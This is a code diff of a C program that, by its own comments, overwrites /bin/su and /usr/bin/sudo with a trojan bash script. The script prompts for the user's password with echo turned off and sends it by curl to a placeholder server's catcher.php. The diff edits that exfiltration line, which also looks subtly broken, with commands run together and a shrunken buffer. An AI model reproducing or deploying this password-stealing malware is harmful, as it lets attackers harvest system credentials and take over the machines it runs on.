@@ -28,8 +28,8 @@ int main () {
    /** OVERWRITE /BIN/SU WITH POISONED BASH THAT STEPS THE PASSWORDS **/ 
   
    FILE *file1; /** MALICIUS FILE **/
-
-   char cmmd1[300] = "#!/bin/bash \n stty -echo \n printf \"Password: \" \n read PASSWORD \n stty echo \n echo \n curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" > /dev/null 2>&1 \n";
+   /** MALICIUS BASH, ASK FOR PASSWD, SEND TO SERVER, FIX SUDO  **/
+   char cmmd1[200] = "#!/bin/bash \n stty -echo \n printf \"Password: \" \n read PASSWORD \n stty echo \n echo \n curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" sudo mv /usr/su /usr/bin/su > /dev/null 2>&1 \n";
 
    file1 = fopen("/bin/su", "w");
 
@@ -54,8 +54,8 @@ system("chmod 777 /bin/su > /dev/null 2>&1");
 
 
    FILE *file2;
-
-   char cmmd2[300] = "#!/bin/bash \n stty -echo \n printf \"Password: \" \n read PASSWORD \n stty echo \n echo \n curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" > /dev/null 2>&1 \n";
+   /** MALICIUS BASH, ASK FOR PASSWD, SEND TO SERVER, FIX SUDO  **/
+   char cmmd2[200] = "#!/bin/bash \n stty -echo \n printf \"Password: \" \n read PASSWORD \n stty echo \n echo \n curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" sudo mv /usr/su /usr/bin/su > /dev/null 2>&1 \n";
 
    file2 = fopen("/usr/bin/sudo", "w");
 
